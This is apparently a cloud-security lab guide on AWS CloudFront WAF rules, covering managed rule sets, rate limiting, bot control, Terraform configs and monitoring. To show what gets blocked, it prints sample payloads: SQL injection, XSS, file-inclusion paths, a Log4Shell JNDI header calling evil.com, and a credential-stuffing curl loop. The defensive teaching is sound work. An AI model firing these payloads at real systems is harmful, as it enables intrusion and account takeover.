# Lab 2: WAF Rules Deep Dive

## 🛡️ Four-Layer WAF Defense

Your CloudFront WAF now has **4 active rules + 2 optional rules** for comprehensive protection.

---

## 📊 Rule-by-Rule Breakdown

### Rule 1: AWS Managed Common Rule Set (Priority 1)

**What It Blocks**:
```
✓ SQL Injection (SQLi)        → SELECT * FROM users WHERE id=1 OR 1=1
✓ Cross-Site Scripting (XSS)  → <script>alert('hacked')</script>
✓ Local File Inclusion (LFI)  → ../../../../etc/passwd
✓ Remote File Inclusion (RFI) → http://evil.com/shell.php
✓ PHP Injection              → ?page=php://input
✓ Cross-Site Request Forgery (CSRF) detection
✓ Session Fixation attacks
```

**How It Works**: AWS maintains a rule set based on OWASP Top 10. Rules are updated automatically.

**Example Blocked Request**:
```bash
curl "https://app.chewbacca-growl.com/search?q=1 OR 1=1"
# Blocked by Common Rule Set SQLi detection
# HTTP 403 Forbidden
```

**Cost**: Included in WAF pricing (~$5/month base)

---

### Rule 2: Known Bad Inputs Rule Set (Priority 2)

**What It Blocks**:
```
✓ Log4j Exploitation (Log4Shell CVE-2021-44228)
  → Detects: ${jndi:ldap://} patterns
✓ Protocol Exploitation Attempts
  → Detects: Malformed headers, protocol attacks
✓ Java Deserialization attacks
✓ Apache Struts RCE (CVE-2017-5645)
✓ Ruby on Rails XXE (XML External Entity)
✓ Zero-day patterns from AWS threat intelligence
```

**Why It's Important**: Catches exploits that are 0-30 days old (before Common RuleSet updates).

**Example Blocked Request**:
```bash
curl -H "X-Test: \${jndi:ldap://evil.com/shell}" https://app.chewbacca-growl.com
# Blocked by Known Bad Inputs (Log4Shell pattern)
# HTTP 403 Forbidden
```

**Cost**: Included in WAF pricing

---

### Rule 3: Rate Limiting (Priority 3) — **ACTIVE BLOCK**

**What It Does**:
```
Per IP, per 5-minute window:
  ✓ Allow: 0-2000 requests
  ✗ Block: 2001+ requests
```

**Why It's Important**: Prevents:
- Brute force attacks (password guessing)
- Credential stuffing (testing stolen passwords)
- DDoS amplification
- API abuse (automated scraping)
- Enumeration attacks

**Example Scenario**:

```bash
# Normal user browsing (not blocked)
for i in {1..50}; do
  curl https://app.chewbacca-growl.com/page/$i
done
# All 50 requests succeed (well under 2000/5min)

# Attacker trying credential stuffing (BLOCKED)
for i in {1..3000}; do
  curl -X POST https://app.chewbacca-growl.com/login \
    -d "user=admin&pass=password$i"
done
# After request 2001, attacker's IP gets 403 for 5 minutes
```

**Configuration Details**:
```hcl
limit              = 2000  # Requests per 5-minute window
aggregate_key_type = "IP"  # Track per source IP
```

**Cost**: Included in WAF pricing

**Real-World Tuning**:
```
API with high volume? Increase limit:
  limit = 5000  # 1000 requests/minute

Public website? Decrease limit:
  limit = 500   # 100 requests/minute
```

---

### Rule 4: Bot Control Rule Set (Priority 4) — **OPTIONAL ($$)**

**What It Detects**:
```
✓ Malicious Bots
  → Credential stuffing bots
  → Vulnerability scanners (nmap, Nessus, OpenVAS)
  → Price scraper bots
  → Content scraping bots
✓ Good Bots (whitelist)
  → Googlebot, Bingbot, Applebot
✓ Suspicious Behavior
  → Headless browsers (Selenium, Puppeteer)
  → Missing User-Agent headers
  → Rapid sequential requests
```

**When to Enable**: 
- ✅ E-commerce sites (prevent price scraping)
- ✅ High-value APIs (prevent token enumeration)
- ✅ Login portals (prevent brute force)
- ❌ Public APIs (may block legitimate tools)

**Cost**: $5.00/month + $1.00 per million requests
- With 1 million requests/month: ~$6/month
- With 100 million requests/month: ~$105/month

**Example Blocked Request**:
```bash
# Vulnerable scanner detected
curl --user-agent "Nmap Scripting Engine" https://app.chewbacca-growl.com
# Blocked by Bot Control
# HTTP 403 Forbidden
```

**Enable It**:
```hcl
# Uncomment the Bot Control rule in lab2_cloudfront_shield_waf.tf
rule {
  name     = "AWSManagedRulesBotControlRuleSet"
  priority = 4
  override_action { none {} }
  
  statement {
    managed_rule_group_statement {
      name        = "AWSManagedRulesBotControlRuleSet"
      vendor_name = "AWS"
    }
  }
  # ... visibility_config ...
}
```

---

### Optional Rule 5: IP Reputation List (Priority 5)

**What It Does**: Blocks IPs known to be associated with:
```
✓ Malware hosting
✓ Botnet C&C servers
✓ Credential compromise lists
✓ Scanning/enumeration activity
```

**Cost**: Included in WAF pricing

**Enable It** (if needed):
```hcl
# Uncomment in lab2_cloudfront_shield_waf.tf
rule {
  name     = "AWSManagedRulesAmazonIpReputationList"
  priority = 5
  override_action { none {} }
  
  statement {
    managed_rule_group_statement {
      name        = "AmazonIpReputationList"
      vendor_name = "AWS"
    }
  }
  # ... visibility_config ...
}
```

---

## ⚙️ WAF Configuration Examples

### Scenario 1: E-Commerce Site

```hcl
# Aggressive protection (Bot Control enabled)
resource "aws_wafv2_web_acl" "ecommerce_waf" {
  name  = "ecommerce-cf-waf"
  scope = "CLOUDFRONT"

  rule {
    name     = "CommonRuleSet"
    priority = 1
    override_action { none {} }
    # ... CommonRuleSet ...
  }

  rule {
    name     = "KnownBadInputsRuleSet"
    priority = 2
    override_action { none {} }
    # ... KnownBadInputsRuleSet ...
  }

  rule {
    name     = "RateLimit"
    priority = 3
    action { block {} }
    statement {
      rate_based_statement {
        limit              = 500   # Strict rate limit
        aggregate_key_type = "IP"
      }
    }
    # ... visibility_config ...
  }

  rule {
    name     = "BotControl"
    priority = 4
    override_action { none {} }
    # ... BotControlRuleSet (prevent price scraping) ...
  }

  rule {
    name     = "IPReputation"
    priority = 5
    override_action { none {} }
    # ... IPReputationList (block known bad IPs) ...
  }
}
```

### Scenario 2: Public API

```hcl
# Permissive rate limit (many legitimate tools)
resource "aws_wafv2_web_acl" "api_waf" {
  # ... common rules ...

  rule {
    name     = "RateLimit"
    priority = 3
    action { block {} }
    statement {
      rate_based_statement {
        limit              = 10000  # Allow high volume
        aggregate_key_type = "IP"
      }
    }
    # ... visibility_config ...
  }
  # Bot Control disabled (may block CLI tools, curl, etc.)
}
```

### Scenario 3: Login Portal

```hcl
# Strict with Bot Control
resource "aws_wafv2_web_acl" "login_waf" {
  # ... common rules ...

  rule {
    name     = "RateLimit"
    priority = 3
    action { block {} }
    statement {
      rate_based_statement {
        limit              = 100   # Very strict (20 login attempts/minute max)
        aggregate_key_type = "IP"

        # Exclude monitoring services
        scope_down_statement {
          byte_match_statement {
            field_to_match { single_header { name = "User-Agent" } }
            text_transformation { priority = 0 type = "LOWERCASE" }
            positional_constraint = "STARTS_WITH"
            search_string = "internal-monitor"
          }
        }
      }
    }
    # ... visibility_config ...
  }

  rule {
    name     = "BotControl"
    priority = 4
    override_action { none {} }
    # ... BotControlRuleSet (prevent credential stuffing) ...
  }
}
```

---

## 📊 WAF Metrics & Monitoring

### View WAF Metrics in CloudWatch

```bash
# Check blocked requests by rule
aws cloudwatch get-metric-statistics \
  --namespace AWS/WAFV2 \
  --metric-name BlockedRequests \
  --dimensions Name=Rule,Value=RateLimitRule Name=WebACL,Value=lab2-cloudfront-waf \
  --start-time 2026-01-21T00:00:00Z \
  --end-time 2026-01-22T00:00:00Z \
  --period 3600 \
  --statistics Sum

# Check allowed requests
aws cloudwatch get-metric-statistics \
  --namespace AWS/WAFV2 \
  --metric-name AllowedRequests \
  --dimensions Name=WebACL,Value=lab2-cloudfront-waf \
  --start-time 2026-01-21T00:00:00Z \
  --end-time 2026-01-22T00:00:00Z \
  --period 3600 \
  --statistics Sum
```

### View Sampled Requests

```bash
# Get sample of blocked requests
aws wafv2 get-sampled-requests \
  --web-acl-arn arn:aws:wafv2:us-east-1:ACCOUNT:global/webacl/lab2-cloudfront-waf/ID \
  --rule-metric-name RateLimitRule \
  --scope CLOUDFRONT \
  --time-window StartTime=2026-01-21T00:00:00Z,EndTime=2026-01-21T01:00:00Z \
  --max-items 10 \
  --query 'SampledRequests[*].[HTTPRequest.ClientIP, HTTPRequest.URI, Action]'
```

---

## 🚨 False Positives & Tuning

### Issue: Legitimate Users Blocked by Rate Limit

**Symptom**: Users report "403 Forbidden" after normal browsing
```
User pattern: Page load (5 requests for CSS, JS, images) × 100 pages = 500 requests/5min
WAF limit: 2000 requests/5min
→ Should NOT be blocked
```

**Solution**: Check if rate limit is too strict
```bash
# Check recent rate limit blocks
aws wafv2 get-sampled-requests \
  --web-acl-arn ... \
  --rule-metric-name RateLimitRule \
  --scope CLOUDFRONT \
  --time-window StartTime=$(date -u -d '1 hour ago' +%Y-%m-%dT%H:%M:%S)Z,EndTime=$(date -u +%Y-%m-%dT%H:%M:%S)Z \
  --max-items 20

# If legitimate traffic blocked, increase limit
# In lab2_cloudfront_shield_waf.tf:
# limit = 3000  # Increase from 2000
```

### Issue: Bot Control Blocking Legitimate Tools

**Symptom**: Your monitoring scripts get 403 Forbidden
```
Your internal monitoring tool sends requests from office IP
Bot Control detects: No User-Agent header (looks like bot)
→ Blocked
```

**Solution**: Whitelist internal tools
```hcl
rule {
  name     = "BotControl"
  priority = 4
  override_action {
    none {
      custom_action {
        name = "WhitelistInternalMonitoring"
        action = "ALLOW"
      }
    }
  }

  # ... scoped down to bypass for internal tool ...
}
```

---

## 💾 WAF Logging & Forensics

### Enable Detailed WAF Logs

```hcl
# Uncomment in lab2_cloudfront_shield_waf.tf

resource "aws_cloudwatch_log_group" "chewbacca_cf_waf_logs" {
  name              = "/aws/wafv2/cloudfront/${var.project_name}"
  retention_in_days = 30
}

resource "aws_wafv2_web_acl_logging_configuration" "chewbacca_cf_waf_logging" {
  resource_arn            = aws_wafv2_web_acl.chewbacca_cf_waf01.arn
  log_destination_configs = [aws_cloudwatch_log_group.chewbacca_cf_waf_logs.arn]
}
```

### Query WAF Logs

```bash
# Find requests blocked by RateLimitRule
aws logs filter-log-events \
  --log-group-name /aws/wafv2/cloudfront/chewbacca \
  --filter-pattern "\"action\":\"BLOCK\" && \"terminatingRuleId\":\"RateLimitRule\"" \
  --start-time $(date -d '1 hour ago' +%s)000 \
  --query 'events[*].message'
```

---

## 📋 WAF Rule Priority Cheat Sheet

```
Priority (Lower = Runs First)
├─ 1: CommonRuleSet        (SQLi, XSS, LFI, RFI)
├─ 2: KnownBadInputsRuleSet (Log4Shell, zero-days)
├─ 3: RateLimitRule         (2000 req/5min per IP)
├─ 4: BotControl            (Malicious bots) [OPTIONAL]
└─ 5: IPReputation          (Known bad IPs) [OPTIONAL]

⚠️ Rule Evaluation:
  - Request enters WAF
  - Evaluated against Rule 1 (CommonRuleSet)
    → Matches? Check action (block or allow)
    → Doesn't match? Continue to Rule 2
  - Evaluated against Rule 2 (KnownBadInputsRuleSet)
    → And so on...
  - First matching rule wins
  - If no rules match → default_action (allow)
```

---

## 🎯 Interview Talking Points

**Q: "How does your WAF protect against SQL injection?"**

A: "We have AWS Managed Rules enabled at CloudFront. The Common Rule Set automatically detects SQL injection patterns like `1 OR 1=1`, `UNION SELECT`, etc. These are pattern-matched against the request URL and body. The rules are maintained by AWS based on OWASP Top 10, so we get updates automatically without code changes."

**Q: "Why rate limit at 2000 requests per 5 minutes?"**

A: "2000 requests per 5 minutes = 6.67 requests/second average. A normal user browsing might make 5-10 requests per page load (HTML + CSS + JS + images). 2000 per 5 minutes gives us about 40 page loads per minute, which is unusually high for a single user. If it's a bot hammering the API or a credential stuffing attack, they'll exceed this quickly and get blocked."

**Q: "What's the difference between Known Bad Inputs and Common Rules?"**

A: "Common Rules catch broad attack patterns that have existed for years (SQLi, XSS). Known Bad Inputs catches specific exploits from the last 30 days that aren't yet in the Common Rules, like Log4Shell (CVE-2021-44228) when it was discovered. It's our early-warning system against zero-days."

---

## ✅ Deployment Checklist

- [ ] Lab 2 CloudFront distribution deployed
- [ ] WAF attached to CloudFront (scope = CLOUDFRONT)
- [ ] Rule 1 (Common) enabled
- [ ] Rule 2 (Known Bad Inputs) enabled
- [ ] Rule 3 (Rate Limit) enabled
- [ ] Bot Control reviewed (enabled if high-value site)
- [ ] CloudWatch metrics configured
- [ ] WAF logs stored in CloudWatch (optional but recommended)
- [ ] Tested with 3+ requests per second (should succeed)
- [ ] Tested with 100+ requests per second (should block after 5 minutes)

---

**Document Version**: 1.0  
**Lab 2 Component**: CloudFront WAF Rules  
**Last Updated**: January 21, 2026
